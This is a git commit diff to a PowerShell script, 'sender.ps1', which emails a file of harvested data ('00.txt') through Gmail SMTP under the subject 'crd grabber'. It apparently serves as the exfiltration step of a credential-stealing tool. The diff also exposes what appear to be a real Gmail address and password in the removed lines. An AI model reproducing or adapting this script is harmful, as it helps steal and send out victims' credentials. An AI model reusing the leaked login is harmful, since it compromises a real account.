376a0cd5a9959817735448b96eb9f2b7cdd7e129
Muhammet Orazmyradov <orazmyradov@hotmail.com>
2022-05-16 12:16:38 +0200

    Update sender.ps1

--- sender.ps1
+++ sender.ps1
@@ -1,10 +1,10 @@
 $SmtpServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('leylon2382@gmail.com', 'Orazmyradov_02052002')
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('sender@gmail.com', 'senderpass')
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'leylon2382@gmail.com'
-$ReportEmail.To.Add('leylon2381@gmail.com')
+$ReportEmail.From = 'sender@gmail.com'
+$ReportEmail.To.Add('recipient@gmail.com')
 $ReportEmail.Subject = 'crd grabber'
 $ReportEmail.Body = 'retriever of grabbed content'
 $ReportEmail.Attachments.Add('00.txt')
